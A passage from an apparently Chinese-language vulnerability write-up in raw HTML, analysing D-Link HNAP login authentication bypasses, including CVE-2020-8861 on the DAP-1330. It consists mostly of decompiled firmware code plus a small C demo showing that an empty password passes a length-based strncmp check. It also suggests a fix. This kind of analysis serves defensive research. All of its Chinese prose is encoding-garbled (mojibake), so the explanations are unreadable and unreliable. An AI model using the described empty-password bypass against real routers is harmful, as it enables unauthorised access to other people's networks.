&#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>äº¤å‰å¼•ç”¨æ­¤å‡½æ•°æ‰¾åˆ°äº†åˆ¤æ–­ login è¯·æ±‚çš„å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_004249ec</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  FUN_00424610(param_1);</span><br><span class="line">  iVar1 = FUN_0041ed9c(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Action&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;request&quot;</span>,<span class="number">7</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;login&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;logout&quot;</span>,<span class="number">6</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          FUN_00424c88(param_1,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          FUN_00422420(param_1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        hnap_login(param_1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      FUN_004206c0(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00423bd4(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = FUN_00423d70(param_1);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      uVar2 = FUN_00422764(param_1);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00424890(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) &#123;</span><br><span class="line">    websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar2 = FUN_00423ecc(param_1);</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡å–å¾— &#x2F;Login&#x2F;Action å­—æ®µæ¥åˆ¤æ–­è¿™ä¸ªè¯·æ±‚æ˜¯ç™»å½•è¿˜æ˜¯ç™»å‡ºã€‚äºæ˜¯å¯ä»¥å®šä½åˆ°ç™»å½•è¯·æ±‚å‡½æ•° hnap_loginã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">hnap_login</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  uchar *data;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *username;</span><br><span class="line">  <span class="type">char</span> *password;</span><br><span class="line">  <span class="type">size_t</span> len;</span><br><span class="line">  EVP_MD *md;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">char</span> *local_378;</span><br><span class="line">  uint local_374;</span><br><span class="line">  <span class="type">char</span> realPassword [<span class="number">512</span>];</span><br><span class="line">  byte abStack352 [<span class="number">128</span>];</span><br><span class="line">  uint local_e0;</span><br><span class="line">  HMAC_CTX HStack220;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(realPassword,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">memset</span>(abStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_378 = realPassword;</span><br><span class="line">  local_e0 = <span class="number">0x80</span>;</span><br><span class="line">  __s = (<span class="type">char</span> *)websGetRequestPrivateKey(param_1);</span><br><span class="line">  data = (uchar *)FUN_0042176c(param_1);</span><br><span class="line">  iVar1 = FUN_00421a44(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  username = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Username&quot;</span>);</span><br><span class="line">  password = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/LoginPassword&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((__s == (<span class="type">char</span> *)<span class="number">0x0</span>) || (data == (uchar *)<span class="number">0x0</span>)) || (username == (<span class="type">char</span> *)<span class="number">0x0</span>)) ||</span><br><span class="line">     ((password == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">      ((iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;Admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)))))) &#123;</span><br><span class="line">LAB_004223b8:</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">4</span>);</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    HMAC_CTX_init(&amp;HStack220);</span><br><span class="line">    len = <span class="built_in">strlen</span>(__s);</span><br><span class="line">    md = EVP_md5();</span><br><span class="line">    HMAC_Init_ex(&amp;HStack220,__s,len,md,(ENGINE *)<span class="number">0x0</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>((<span class="type">char</span> *)data);</span><br><span class="line">    HMAC_Update(&amp;HStack220,data,len);</span><br><span class="line">    HMAC_Final(&amp;HStack220,abStack352,&amp;local_e0);</span><br><span class="line">    HMAC_CTX_cleanup(&amp;HStack220);</span><br><span class="line">    local_374 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (local_374 != local_e0) &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(local_378,<span class="string">&quot;%02x&quot;</span>,(uint)abStack352[local_374]);</span><br><span class="line">      local_374 = local_374 + <span class="number">1</span>;</span><br><span class="line">      local_378 = local_378 + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0041df08(realPassword,<span class="number">0x200</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_safe_get(<span class="string">&quot;IsDefaultLogin&quot;</span>);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      len = <span class="built_in">strlen</span>(password);</span><br><span class="line">      iVar1 = <span class="built_in">strncmp</span>(realPassword,password,len);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        FUN_00421dcc(param_1);</span><br><span class="line">        <span class="keyword">goto</span> LAB_004223b8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0042194c(param_1);</span><br><span class="line">    FUN_0041fee8(param_1);</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">1</span>);</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°çš„ä»£ç æ¯”è¾ƒå¤šï¼Œæˆ‘ç”¨ C å†™äº†ä¸€ä¸ªç®€åŒ–ç‰ˆ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* password = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* realUsername = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* realPassword = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(realUsername, username, <span class="number">5</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Username incorrect!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(password);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(realPassword, password, len))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Success\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‰ä¸¤ä¸ªå­—ç¬¦ä¸²ä»£è¡¨ç”¨æˆ·çš„è¯·æ±‚ï¼Œåä¸¤ä¸ªä»£è¡¨æ­£ç¡®çš„å­—ç¬¦ä¸²ï¼Œä»£ç åˆ¤æ–­é€»è¾‘æ˜¯è¦æ±‚ç”¨æˆ·åç­‰äº adminï¼Œè¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯åœ¨åˆ¤æ–­å¯†ç çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šä½¿ç”¨ strlen è®¡ç®—ç”¨æˆ·è¾“å…¥çš„å¯†ç é•¿åº¦ï¼Œç„¶åå¸¦å…¥ strncmp å‡½æ•°å’Œæ­£ç¡®çš„å¯†ç è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„å¯†ç ä¸ºç©ºï¼Œé‚£ä¹ˆæœ€ç»ˆå‚ä¸ strncmp æ¯”è¾ƒçš„ len å°±æ˜¯ 0ï¼Œæ­¤æ—¶å‡½æ•°ä¼šé»˜è®¤è¿”å› 0ã€‚</p>
<p>äºæ˜¯éªŒè¯æˆåŠŸå°±å­˜åœ¨äº†ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯å¯†ç çœŸçš„æ­£ç¡®ï¼ŒäºŒæ˜¯å¯†ç ä¸ºç©ºï¼Œå¤§å®¶å¯ä»¥è‡ªå·±ç¼–è¯‘ä¸Šé¢çš„ä»£ç è¯•ä¸€ä¸‹ã€‚</p>
<p>ä¿®å¤æ‰‹æ®µå‘¢ï¼Ÿå¯ä»¥åœ¨ strlen è®¡ç®—å¯†ç é•¿åº¦ä¹‹åå¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç­‰äºé›¶å°±ç›´æ¥è¿”å›ç™»å½•å¤±è´¥ã€‚</p>
<p>ç»è¿‡æµ‹è¯•ï¼ŒDIR 878 ç­‰å‹å·çš„è·¯ç”±å™¨å¯¹äº HNAP login è¯·æ±‚çš„å¤„ç†æ˜¯ç›¸åŒçš„ï¼Œæ¼æ´çš„æˆå› ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p>
<h1 id="CVE-2020-8861"><a href="#CVE-2020-8861" class="headerlink" title="CVE-2020-8861"></a>CVE-2020-8861</h1><p>å½±å“ DAP-1330 Wi-Fi æ‹“å±•å™¨ã€‚</p>
<h2 id="æ¼æ´åŸºæœ¬ä¿¡æ¯-1"><a href="#æ¼æ´åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="æ¼æ´åŸºæœ¬ä¿¡æ¯"></a>æ¼æ´åŸºæœ¬ä¿¡æ¯</h2><p>æ‘˜æŠ„æ¼æ´æè¿°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DAP-1330 Wi-Fi range extenders. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of cookies. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div>

<p>æ¼æ´å‡ºç°åœ¨å¤„ç† HNAP è¯·æ±‚ä¸­ï¼Œå¯¹äº cookie çš„å¤„ç†ä¸æ°å½“å¯ä»¥å¯¼è‡´èº«ä»½éªŒè¯ç»•è¿‡ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®æ•æ„Ÿ API ï¼Œç¯¡æ”¹ç®¡ç†å‘˜è´¦æˆ·å¯†ç ã€‚ </p>
<h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆå» <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸‹è½½å›ºä»¶ï¼Œæ³¨æ„éœ€è¦ä¸‹è½½ v1.01B04 ç‰ˆæœ¬å›ºä»¶ï¼Œå› ä¸ºåœ¨æœ€æ–°ç‰ˆä¸­æ¼æ´å·²ç»ä¿®å¤ã€‚</p>
<p>æ ¹æ®æ¼æ´æè¿°æ‰¾ä¸åˆ°å¤ªå¤šçš„ä¿¡æ¯ï¼Œé€šè¿‡æœç´¢ cookie å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†å¯èƒ½æ˜¯ç”¨äºå¤„ç† login è¯·æ±‚çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ä½äº libhnap.so å…±äº«åº“ä¸­ï¼Œå‡½æ•°å check_login_addrï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_login_addr</span><span class="params">(undefined4 param_1,<span class="type">char</span> *param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">uint32_t</span> uVar5;</span><br><span class="line">  <span class="type">uint32_t</span> uVar6;</span><br><span class="line">  <span class="type">uint32_t</span> uVar7;</span><br><span class="line">  <span class="type">uint32_t</span> uVar8;</span><br><span class="line">  <span class="type">time_t</span> local_2c0;</span><br><span class="line">  <span class="type">char</span> *local_2bc;</span><br><span class="line">  <span class="type">int</span> local_2b8;</span><br><span class="line">  <span class="type">char</span> *local_2b4;</span><br><span class="line">  <span class="type">char</span> *local_2b0;</span><br><span class="line">  undefined4 local_2ac;</span><br><span class="line">  undefined2 local_2a8;</span><br><span class="line">  undefined4 local_2a4;</span><br><span class="line">  undefined4 local_2a0;</span><br><span class="line">  undefined2 local_29c;</span><br><span class="line">  undefined local_29a;</span><br><span class="line">  <span class="type">uint32_t</span> local_298;</span><br><span class="line">  <span class="type">uint32_t</span> local_294;</span><br><span class="line">  <span class="type">uint32_t</span> local_290;</span><br><span class="line">  <span class="type">uint32_t</span> local_28c;</span><br><span class="line">  undefined4 local_288;</span><br><span class="line">  undefined4 local_284;</span><br><span class="line">  undefined4 local_280;</span><br><span class="line">  undefined4 local_27c;</span><br><span class="line">  undefined4 local_278;</span><br><span class="line">  undefined local_274;</span><br><span class="line">  undefined4 local_270;</span><br><span class="line">  undefined4 local_26c;</span><br><span class="line">  undefined4 local_268;</span><br><span class="line">  undefined4 local_264;</span><br><span class="line">  undefined4 local_260;</span><br><span class="line">  undefined local_25c;</span><br><span class="line">  <span class="type">char</span> acStack600 [<span class="number">36</span>];</span><br><span class="line">  undefined auStack564 [<span class="number">51</span>];</span><br><span class="line">  <span class="type">char</span> local_201;</span><br><span class="line">  undefined local_200;</span><br><span class="line">  <span class="type">char</span> local_1ff;</span><br><span class="line">  undefined auStack495 [<span class="number">67</span>];</span><br><span class="line">  <span class="type">char</span> acStack428 [<span class="number">88</span>];</span><br><span class="line">  <span class="type">char</span> acStack340 [<span class="number">40</span>];</span><br><span class="line">  undefined local_12c;</span><br><span class="line">  <span class="type">char</span> acStack299 [<span class="number">6</span>];</span><br><span class="line">  <span class="type">char</span> acStack293 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack272 [<span class="number">11</span>];</span><br><span class="line">  <span class="type">char</span> acStack261 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack240 [<span class="number">40</span>];</span><br><span class="line">  <span class="type">time_t</span> local_c8;</span><br><span class="line">  <span class="type">char</span> acStack196 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> acStack146 [<span class="number">106</span>];</span><br><span class="line">  </span><br><span class="line">  local_2bc = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b8 = <span class="number">0</span>;</span><br><span class="line">  local_2b4 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b0 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  iVar1 = getElementValue(param_1,<span class="string">&quot;Action&quot;</span>,&amp;local_2bc);</span><br><span class="line">  __s1 = local_2bc;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &lt; iVar1) &#123;</span><br><span class="line">    iVar1 = strcasecmp(local_2bc,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      print_hnap_result(<span class="number">1</span>);</span><br><span class="line">      local_284 = <span class="number">0</span>;</span><br><span class="line">      local_280 = <span class="number">0</span>;</span><br><span class="line">      local_27c = <span class="number">0</span>;</span><br><span class="line">      local_278 = <span class="number">0</span>;</span><br><span class="line">      local_274 = <span class="number">0</span>;</span><br><span class="line">      local_288 = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_288,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Challenge&gt;%s&lt;/Challenge&gt;&quot;</span>,&amp;local_288);</span><br><span class="line">      local_2a4 = <span class="number">0</span>;</span><br><span class="line">      local_2a0 = <span class="number">0</span>;</span><br><span class="line">      local_29c = <span class="number">0</span>;</span><br><span class="line">      local_29a = <span class="number">0</span>;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (__s1 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,&amp;local_2a4);</span><br><span class="line">        iVar1 = isExpireCookie(&amp;local_2a4,param_2);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) <span class="keyword">goto</span> LAB_00017320;</span><br><span class="line">      &#125;</span><br><span class="line">      generate_random_str(&amp;local_2a4,<span class="number">10</span>);</span><br><span class="line">LAB_00017320:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Cookie&gt;%s&lt;/Cookie&gt;&quot;</span>,&amp;local_2a4);</span><br><span class="line">      local_270 = <span class="number">0</span>;</span><br><span class="line">      local_26c = <span class="number">0</span>;</span><br><span class="line">      local_268 = <span class="number">0</span>;</span><br><span class="line">      local_264 = <span class="number">0</span>;</span><br><span class="line">      local_260 = <span class="number">0</span>;</span><br><span class="line">      local_25c = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_270,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;PublicKey&gt;%s&lt;/PublicKey&gt;&quot;</span>,&amp;local_270);</span><br><span class="line">      local_2ac = <span class="number">0</span>;</span><br><span class="line">      local_2a8 = <span class="number">0</span>;</span><br><span class="line">      genAuthImg(&amp;local_2ac,<span class="number">5</span>);</span><br><span class="line">      <span class="built_in">memset</span>(acStack340,<span class="number">0</span>,<span class="number">0x90</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack340,param_2);</span><br><span class="line">      local_12c = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack299,(<span class="type">char</span> *)&amp;local_2ac);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack293,(<span class="type">char</span> *)&amp;local_288);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack272,(<span class="type">char</span> *)&amp;local_2a4);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack261,(<span class="type">char</span> *)&amp;local_270);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack240,<span class="string">&quot;&quot;</span>);</span><br><span class="line">      uVar2 = setLoginInfo(acStack340);</span><br><span class="line">      removeTimeoutLoginInfo();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = strcasecmp(__s1,<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = getElementValue(param_1,<span class="string">&quot;Username&quot;</span>,&amp;local_2b8), <span class="number">1</span> &lt; iVar1)) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(acStack196,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack196,<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">      __s1 = (<span class="type">char</span> *)<span class="built_in">tolower</span>(local_2b8);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack146,__s1);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;local_200,<span class="number">0</span>,<span class="number">0x52</span>);</span><br><span class="line">      getDeviceSecurity(&amp;local_200,acStack196,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (local_1ff == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,acStack272);</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001792c;</span><br><span class="line">      &#125;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      iVar1 = getLoginInfo(__s1,acStack340);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">        uVar2 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(acStack340,param_2);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(auStack564,<span class="number">0</span>,<span class="number">0x34</span>);</span><br><span class="line">        iVar1 = getDeviceSettingsObj(auStack564);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> iVar1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_201 == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">          getElementValue(param_1,<span class="string">&quot;Captcha&quot;</span>,&amp;local_2b0);</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(acStack299,local_2b0);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">            splite_cookie(__s1,acStack272);</span><br><span class="line">            iVar1 = removeLoginInfo(acStack340);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) <span class="keyword">goto</span> LAB_00017940;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = getElementValue(param_1,<span class="string">&quot;LoginPassword&quot;</span>,&amp;local_2b4);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">2</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(acStack428,<span class="number">0</span>,<span class="number">0x55</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack428,<span class="string">&quot;%s%s&quot;</span>,acStack261,auStack495);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack428);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack428,sVar4,&amp;local_298);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack240,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack240);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack240,sVar4,&amp;local_298);</span><br><span class="line">        <span class="built_in">memset</span>(acStack600,<span class="number">0</span>,<span class="number">0x21</span>);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack600,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(local_2b4,acStack600);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">          local_12c = local_200;</span><br><span class="line">          time(&amp;local_2c0);</span><br><span class="line">          local_c8 = local_2c0;</span><br><span class="line">          iVar1 = setLoginInfo(acStack340);</span><br><span class="line">          uVar2 = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">        &#125;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">LAB_0001792c:</span><br><span class="line">        uVar2 = removeLoginInfo(acStack340);</span><br><span class="line">        <span class="keyword">return</span> uVar2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00017940:</span><br><span class="line">  uVar2 = <span 